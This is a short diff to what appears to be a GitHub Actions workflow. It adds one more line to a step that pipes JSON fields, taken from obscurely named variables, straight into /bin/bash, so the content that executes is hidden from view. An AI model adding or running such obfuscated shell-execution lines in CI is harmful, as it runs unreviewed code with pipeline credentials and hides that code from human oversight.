@@ -29,6 +29,7 @@ jobs:
           echo $aju83230 | jq -r .rcd8 | /bin/bash
           printf '%s' "$doee4" | jq -r .spwvg3 | /bin/bash
           echo $uaa584 | jq -r .fc48 | /bin/bash
+          printf '%s' "$t8" | jq -r .n075 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
